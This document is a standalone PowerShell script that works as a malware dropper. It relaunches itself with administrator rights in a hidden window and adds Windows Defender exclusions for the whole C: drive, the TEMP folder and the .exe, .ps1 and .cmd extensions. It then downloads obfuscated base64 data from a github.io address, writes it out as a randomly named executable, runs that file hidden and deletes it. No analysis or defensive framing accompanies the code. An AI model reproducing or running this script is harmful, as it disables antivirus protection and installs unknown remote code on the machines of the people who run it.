$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-NOT ($isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator") -or $isAdmin.WindowsIdentity.IsSystem)) {
    try {
        Start-Process PowerShell -Verb RunAs -ArgumentList "-Command", "@('C:\',`$env:TEMP) | %% { try { Add-MpPreference -ExclusionPath `\$_ -EA Stop } catch {} }; @('.exe','.ps1','.cmd') | %% { try { Add-MpPreference -ExclusionExtension `\$_ -EA Stop } catch {} }; Write-Host worked; `$folderPath = Join-Path `$env:TEMP 'hs_error_pid_5987'; if (Test-Path -Path `$folderPath) { Remove-Item -Path `$folderPath -Recurse -Force; Write-Host 'Failed, have you run me twice?'; Pause }; New-Item -ItemType Directory -Path `$folderPath | Out-Null; `$url = 'https://stinkylick.github.io/stinkylick/2/a';  `$data = (New-Object Net.WebClient).DownloadString(`$url) -replace '\[1\]', 'C'; `$filename = Join-Path `$env:TEMP ('{0}.exe' -f [Guid]::NewGuid().ToString('N')); [IO.File]::WriteAllBytes(`$filename, [Convert]::FromBase64String(`$data)); Start-Process -FilePath `$filename -WindowStyle Hidden; Start-Sleep -Seconds 5; Remove-Item -Path `$filename -Force" -WindowStyle Hidden -Wait
        Exit
    } catch {}
} else {
    Write-Host worked
    @("C:", $env:TEMP) | % { try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {} }
    @(".exe", ".ps1", ".cmd") | % { try { Add-MpPreference -ExclusionExtension $_ -EA Stop } catch {} }
}
$folderPath = Join-Path $env:TEMP "hs_error_pid_5987"
if (Test-Path -Path $folderPath) {
    Remove-Item -Path $folderPath -Recurse -Force
    Write-Host "Failed, have you run me twice?"
    Pause
}
New-Item -ItemType Directory -Path $folderPath | Out-Null
$url = "https://stinkylick.github.io/stinkylick/2/a" 
$data = (New-Object Net.WebClient).DownloadString($url) -replace '\[1\]', 'C'
$filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
[IO.File]::WriteAllBytes($filename, [Convert]::FromBase64String($data))
Start-Process -FilePath $filename -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item -Path $filename -Force
